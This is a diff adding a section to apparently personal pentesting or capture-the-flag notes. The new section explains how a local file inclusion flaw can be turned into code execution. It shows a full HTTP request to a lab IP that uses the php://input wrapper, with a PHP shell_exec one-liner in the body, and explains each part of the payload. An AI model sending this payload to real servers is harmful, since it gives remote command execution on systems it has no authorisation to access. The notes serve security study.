@@ -185,6 +185,34 @@ For windows:
 /windows/panther/unattended.xml
 
 ```
+
+If we are supremely lucky, we can use LFI to get code to execute via PHP, like so:
+
+```
+GET /?paramRF67W=php://input&cmd=whoami HTTP/1.1 
+
+Host: 10.10.10.247:9878
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Content-Length: 42
+
+<?php echo shell_exec($_GET['cmd']); ?>
+
+```
+
+Where ```?paramRF67W=``` is where we can input the "file" to include, ```php://input&cmd=whoami``` is the payload we use, (in this case, it will execute whoami) and ```<?php echo shell_exec($_GET['cmd']); ?>``` MUST be included in the request body, which allows the php code to execute.
+
 # Getting Files to/from Server
 
 Use a web server!
